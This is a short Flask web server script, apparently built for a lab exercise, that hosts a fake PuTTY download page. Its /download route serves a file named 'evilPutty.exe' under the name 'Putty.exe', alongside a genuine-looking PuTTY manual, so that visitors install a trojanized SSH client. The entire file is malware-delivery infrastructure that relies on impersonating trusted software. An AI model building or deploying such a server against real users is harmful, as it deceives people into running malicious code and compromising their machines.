import os
from flask import Flask, request, redirect, url_for, render_template, send_file, request
from werkzeug import secure_filename
import socket


app = Flask(__name__, template_folder='.')
app.config['UPLOAD_FOLDER'] = "."

@app.route("/instructions", methods=['GET'])
def instructions():
    filename = "Putty_Manual.pdf"
    return send_file(filename,
                     mimetype= "application/pdf",
                     attachment_filename='PuTTy_manual.pdf',
                     as_attachment=True)

@app.route("/download", methods=['GET'])
def download():
    filename = "evilPutty.exe"
    return send_file(filename,
                     mimetype= "application/vnd.microsoft.portable-executable",
                     attachment_filename='Putty.exe',
                     as_attachment=True)


@app.route("/", methods=['GET', 'POST'])
def index():
    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="192.168.10.2", port=80, debug=False)
